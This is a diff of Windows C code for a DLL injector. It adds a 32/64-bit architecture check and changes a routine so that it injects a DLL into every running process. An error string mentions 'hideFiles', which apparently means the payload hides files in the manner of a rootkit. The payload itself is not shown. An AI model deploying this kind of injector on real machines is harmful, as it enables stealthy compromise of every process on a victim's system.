@@ -25,6 +25,12 @@ LPVOID injectToProc(const TCHAR* dllPath, DWORD processId) {
 		return NULL;
 	}
 
+	if (getCurProcArchitecture() != getProcArchitecture(processId, hProcess)) {
+		debugOutput(L"Error in injectToProc. Injector and \"injectee\" platforms are not the same.");
+		CloseHandle(hProcess);
+		return NULL;
+	}
+
 	size_t dllPathSize = sizeof(TCHAR) * (wcslen(dllPath) + 1);
 	LPVOID remoteDllPathAddr = VirtualAllocEx(hProcess,
 		NULL,
@@ -109,7 +115,7 @@ cleanup: // cleaning up
 	return retVal;
 }
 
-BOOL injectToAllProcs(const TCHAR* dllPath) {
+BOOL injectToAllProcs(const TCHAR* dllPath32, const TCHAR* dllPath64) {
 	DWORD procsList[MAX_NUMBER_OF_PROCS] = { 0 };
 	DWORD numOfProcs = -1;
 	
@@ -120,22 +126,15 @@ BOOL injectToAllProcs(const TCHAR* dllPath) {
 	for (unsigned int i = 0; i < numOfProcs; ++i) {
 		DWORD processId = procsList[i];
 		if (0 != processId) {
-			// TODO: call to injectAndRun instead of this outrageous code repetition
-			debugOutputNum(L"Injecting to process 0x%08lx", processId);
-			LPVOID pInjectedDllAddr = injectToProc(dllPath, processId);
-			if (NULL == pInjectedDllAddr) {
-				debugOutputNum(L"Failed to inject DLL into process 0x%08lx", processId);
+			DWORD isX64 = getProcArchitecture(processId, NULL);
+			if (-1 == isX64) {
+				debugOutputNum(L"Error in hideFiles. isProc64 failed (%d)", GetLastError());
 				continue;
 			}
-			else {
-				debugOutputNum(L"Successfully injected to process 0x%08lx", processId);
+			const TCHAR* dllToRun = (ARCH_64 == isX64) ? dllPath64 : dllPath32;
+			if (!injectAndRun(dllToRun, processId)) {
+				return FALSE; // the debug message was printed internally
 			}
-			debugOutputNum(L"Running injected code from process 0x%08lx", processId);
-			if (!runInjectedDLL(processId, pInjectedDllAddr, dllPath)) {
-				debugOutputNum(L"Failed to run thread for process 0x%08lx\n", processId);
-				continue;
-			}
-			debugOutputNum(L"Success in running injected code from process 0x%08lx", processId);
 		}
 	}
 	return TRUE;
